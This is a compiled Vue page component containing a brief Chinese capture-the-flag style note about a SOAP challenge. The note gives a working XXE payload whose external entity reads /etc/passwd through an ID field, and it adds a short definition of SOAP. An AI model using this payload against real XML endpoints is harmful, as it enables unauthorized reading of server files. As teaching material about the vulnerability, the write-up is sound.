import{_ as e,o as t,c as s,e as n}from"./app-bf957996.js";const d={},i=n(`<p>#XEE 题目给的比较明显了 就是要用XXE，读取/etc/passwd 抓包，改包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;data&gt;
    &lt;ID&gt;&amp;test;&lt;/ID&gt;
&lt;/data&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>实体引用 <code>&amp;test;</code> 被替换为 <code>file:///etc/passwd</code></p><p>SOAP: SOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。 或者更简单地说：SOAP 是用于访问网络服务的协议。</p>`,4),l=[i];function a(c,o){return t(),s("div",null,l)}const u=e(d,[["render",a],["__file","SOAP.html.vue"]]);export{u as default};
